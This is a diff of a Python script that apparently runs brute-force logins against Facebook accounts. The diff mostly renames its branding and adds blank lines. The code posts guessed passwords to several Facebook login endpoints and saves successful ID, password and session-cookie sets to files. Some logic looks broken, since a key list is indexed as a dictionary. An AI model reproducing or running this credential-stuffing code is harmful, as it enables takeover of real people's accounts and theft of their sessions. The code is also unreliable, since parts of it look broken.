@@ -1033,7 +1033,7 @@ tokenku=[]
 
 os.system(f'xdg-open https://youtube.com/@technicaltricks7982')
 
-def KHUSHAL():
+def Kyzer():
 	clear()
 	#ckx()
 	print(f"[1] FILE CLONING")
@@ -1100,18 +1100,30 @@ def ffb(ids,names,passlist):
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         Kyzer=session.cookies.get_dict().keys()
-                if 'session_key' in Kyzer:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in Kyzer["session_cookies"]);ASIFgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFgift};{ckkk}"
-                    print(f"\r{R} [M1-OK] {sid} | {ps} ")
-					#{S}\n[cookie[🔥]={ckkk}
-                    oks.append(sid)
-                    open('/sdcard/M1-OK-ID.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/M1-OK-ID-W/COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
-                    break
-                elif 'www.facebook.com' in Kyzer['error']['message']:
-                    print(f"\r{A} [M1-CP] {sid} | {ps} {S}")
-                    cps.append(sid)
-                    open('/sdcard/M1-CP.txt','a').write(sid+'|'+ps+'\n')
-                else:
+                if 'session_key' in Kyzer:
+
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in Kyzer["session_cookies"]);ASIFgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFgift};{ckkk}"
+
+                    print(f"\r{R} [M1-OK] {sid} | {ps} ")
+
+					#{S}\n[cookie[🔥]={ckkk}
+
+                    oks.append(sid)
+
+                    open('/sdcard/M1-OK-ID.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/M1-OK-ID-W/COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+
+                    break
+
+                elif 'www.facebook.com' in Kyzer['error']['message']:
+
+                    print(f"\r{A} [M1-CP] {sid} | {ps} {S}")
+
+                    cps.append(sid)
+
+                    open('/sdcard/M1-CP.txt','a').write(sid+'|'+ps+'\n')
+
+                else:
+
                     continue
         except requests.exceptions.ConnectionError:
                 time.sleep(20)
@@ -1138,25 +1150,37 @@ def ffb1(ids,names,passlist):
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.alpha.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://m.alpha.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         Kyzer=session.cookies.get_dict().keys()
-                if 'session_key' in Kyzer:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in Kyzer["session_cookies"]);ASIFgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFgift};{ckkk}"
-                    print(f"\r{R} [M2-OK] {sid} | {ps} ")
-					#{S}\n[cookie[🔥]={ckkk}
-                    oks.append(sid)
-                    open('/sdcard/M2-OK-ID.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/M2-OK-ID-W/COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
-                    break
-                elif 'www.facebook.com' in Kyzer['error']['message']:
-                    print(f"\r{A} [M2-CP] {sid} | {ps} {S}")
-                    cps.append(sid)
-                    open('/sdcard/M2-CP.txt','a').write(sid+'|'+ps+'\n')
-                else:
+                if 'session_key' in Kyzer:
+
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in Kyzer["session_cookies"]);ASIFgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFgift};{ckkk}"
+
+                    print(f"\r{R} [M2-OK] {sid} | {ps} ")
+
+					#{S}\n[cookie[🔥]={ckkk}
+
+                    oks.append(sid)
+
+                    open('/sdcard/M2-OK-ID.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/M2-OK-ID-W/COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+
+                    break
+
+                elif 'www.facebook.com' in Kyzer['error']['message']:
+
+                    print(f"\r{A} [M2-CP] {sid} | {ps} {S}")
+
+                    cps.append(sid)
+
+                    open('/sdcard/M2-CP.txt','a').write(sid+'|'+ps+'\n')
+
+                else:
+
                     continue
         except requests.exceptions.ConnectionError:
                 time.sleep(20)
         loop+=1
 def ffb3(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [KHUSHAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [KYZER] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -1174,18 +1198,30 @@ def ffb3(ids,names,passlist):
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         Kyzer=session.cookies.get_dict().keys()
-                if 'session_key' in Kyzer:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in Kyzer["session_cookies"]);ASIFgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFgift};{ckkk}"
-                    print(f"\r{R} [M3-OK] {sid} | {ps} ")
-					#{S}\n[cookie[🔥]={ckkk}
-                    oks.append(sid)
-                    open('/sdcard/M3-OK-ID.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/M3-OK-ID-W/COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
-                    break
-                elif 'www.facebook.com' in Kyzer['error']['message']:
-                    print(f"\r{A} [M3-CP] {sid} | {ps} {S}")
-                    cps.append(sid)
-                    open('/sdcard/M3-CP.txt','a').write(sid+'|'+ps+'\n')
-                else:
+                if 'session_key' in Kyzer:
+
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in Kyzer["session_cookies"]);ASIFgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFgift};{ckkk}"
+
+                    print(f"\r{R} [M3-OK] {sid} | {ps} ")
+
+					#{S}\n[cookie[🔥]={ckkk}
+
+                    oks.append(sid)
+
+                    open('/sdcard/M3-OK-ID.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/M3-OK-ID-W/COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+
+                    break
+
+                elif 'www.facebook.com' in Kyzer['error']['message']:
+
+                    print(f"\r{A} [M3-CP] {sid} | {ps} {S}")
+
+                    cps.append(sid)
+
+                    open('/sdcard/M3-CP.txt','a').write(sid+'|'+ps+'\n')
+
+                else:
+
                     continue
         except requests.exceptions.ConnectionError:
                 time.sleep(20)
@@ -1195,7 +1231,7 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [KHUSHAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [KYZER] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -1248,18 +1284,30 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                         Kyzer=session.cookies.get_dict().keys()
-                if 'session_key' in Kyzer:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in Kyzer["session_cookies"]);ASIFgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFgift};{ckkk}"
-                    print(f"\r{R} [M4-OK] {sid} | {ps} ")
-					#{S}\n[cookie[🔥]={ckkk}
-                    oks.append(sid)
-                    open('/sdcard/M4-OK-ID.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/M4-OK-ID-W/COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
-                    break
-                elif 'www.facebook.com' in Kyzer['error']['message']:
-                    print(f"\r{A} [M4-CP] {sid} | {ps} {S}")
-                    cps.append(sid)
-                    open('/sdcard/M4-CP.txt','a').write(sid+'|'+ps+'\n')
-                else:
+                if 'session_key' in Kyzer:
+
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in Kyzer["session_cookies"]);ASIFgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFgift};{ckkk}"
+
+                    print(f"\r{R} [M4-OK] {sid} | {ps} ")
+
+					#{S}\n[cookie[🔥]={ckkk}
+
+                    oks.append(sid)
+
+                    open('/sdcard/M4-OK-ID.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/M4-OK-ID-W/COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+
+                    break
+
+                elif 'www.facebook.com' in Kyzer['error']['message']:
+
+                    print(f"\r{A} [M4-CP] {sid} | {ps} {S}")
+
+                    cps.append(sid)
+
+                    open('/sdcard/M4-CP.txt','a').write(sid+'|'+ps+'\n')
+
+                else:
+
                     continue
                         loop+=1
                 except requests.exceptions.ConnectionError:
@@ -1269,7 +1317,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [KHUSHAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [KYZER] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -1345,4 +1393,4 @@ def api1(ids,names,passlist):
                         pass
 
 
-KHUSHAL()
+Kyzer()
